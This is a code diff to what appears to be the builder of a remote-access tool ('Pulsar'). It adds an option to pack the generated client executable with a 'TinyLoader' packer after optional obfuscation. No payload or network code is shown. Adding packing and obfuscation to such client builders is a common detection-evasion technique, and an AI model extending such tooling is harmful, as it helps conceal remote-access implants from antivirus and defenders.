@@ -29,7 +29,7 @@ namespace Pulsar.Server.Build
         /// <summary>
         /// Builds a client executable.
         /// </summary>
-        public void Build(bool obfuscateBuild)
+        public void Build(bool obfuscateBuild, bool packBuild)
         {
             using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
             {
@@ -43,23 +43,29 @@ namespace Pulsar.Server.Build
                 if (!r.Perform())
                     throw new Exception("renaming failed");
 
+                MemoryStream stream = new MemoryStream();
+                asmDef.Write(stream);
+                stream.Position = 0;
+                asmDef.Dispose();
+
+                byte[] buffer = stream.ToArray();
+
                 if (obfuscateBuild)
                 {
-                    MemoryStream stream = new MemoryStream();
-                    asmDef.Write(stream);
-                    stream.Position = 0;
-                    asmDef.Dispose();
-                    Obfuscator.Obfuscator obf = new Obfuscator.Obfuscator(stream.ToArray());
-
+                    Obfuscator.Obfuscator obf = new Obfuscator.Obfuscator(buffer);
                     obf.Obfuscate();
-
-                    obf.Save(_options.OutputPath);
-                } else
-                {
-                    asmDef.Write(_options.OutputPath);
+                    buffer = obf.Save();
                 }
+                if(packBuild)
+                {
+                    TinyLoader.TinyLoader tinyLoader = new TinyLoader.TinyLoader(buffer);
+                    tinyLoader.Pack();
+                    buffer = tinyLoader.Save();
+                }
+             
 
-               
+                File.WriteAllBytes(_options.OutputPath, buffer);
+
 
             }
 
